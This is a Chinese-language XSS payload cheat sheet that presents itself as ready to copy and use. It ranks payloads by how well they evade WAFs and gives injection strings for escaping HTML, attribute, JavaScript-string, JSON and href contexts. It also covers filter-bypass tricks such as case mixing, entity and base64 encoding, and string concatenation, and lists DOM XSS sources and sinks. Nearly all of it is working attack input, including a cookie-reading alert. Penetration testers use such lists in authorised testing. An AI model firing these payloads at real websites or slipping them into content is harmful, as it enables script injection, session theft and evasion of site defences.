# XSS Payload 库

> 按罕见度排序，越往下越能打 WAF。直接复制使用。

## 基础 Payload（已被多数 WAF 收录）

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>prompt(1)</script>
<script>confirm(1)</script>
<img src=x onerror=alert(1)>
<img src=1 onerror=prompt(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
```

## 中等难度

```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

## 罕见 Event（能打 WAF）

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>
<body onpageshow=alert(1)>
<body onhashchange=alert(1)>
<details open ontoggle=alert(1)>
<marquee onfinish=alert(1)>
<image onloadend=alert(1)>
<object data="javascript:alert(1)">
```

## 上下文逃逸

```html
<!-- HTML标签内 -->
<div>HERE</div> → <svg onload=alert(1)>

<!-- 属性值内 -->
<input value="HERE"> → " autofocus onfocus=alert(1) "
<input type="hidden" value="HERE"> → " accesskey=X onclick=alert(1)

<!-- JS字符串内 -->
<script>var x="HERE"</script> → ";alert(1);//
<script>var x='HERE'</script> → ';alert(1);//

<!-- JSON内 -->
<script>var x={"k":"HERE"}</script> → '-alert(1)-'

<!-- 模板字符串 -->
<script>var x=`HERE`</script> → ${alert(1)}

<!-- href内 -->
<a href="HERE"> → javascript:alert(1)
<a href="HERE"> → data:text/html,<script>alert(1)</script>

<!-- 事件内 -->
<a onclick="HERE"> → alert(1)
```

## 绕过技术

```html
<!-- 大小写 -->
<ScRiPt>alert(1)</ScRiPt>
<ImG sRc=x oNeRrOr=alert(1)>

<!-- HTML实体 -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

<!-- 拼接 -->
eval('al'+'ert(1)')
Function('alert(1)')()
window['al'+'ert'](1)
setTimeout('alert(1)',0)
[].constructor.constructor('alert(1)')()

<!-- 模板字符串绕括号 -->
alert`1`
setTimeout`alert(1)`

<!-- 编码层 -->
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
javascript:alert(1)
\x3cscript\x3ealert(1)\x3c/script\x3e

<!-- 空白字符 -->
<svG/onload=alert(1)>
<svg><script>alert(1)</script>
```

## DOM XSS — Source/Sink

```javascript
// Sources
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
location.href
location.search
location.hash
location.pathname
window.name
document.referrer

// Sinks
eval()
Function()
setTimeout()
setInterval()
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML()
```

## 浏览器验证

用浏览器引擎打开目标页面 → 注入 payload → 截图弹窗 → 作为证据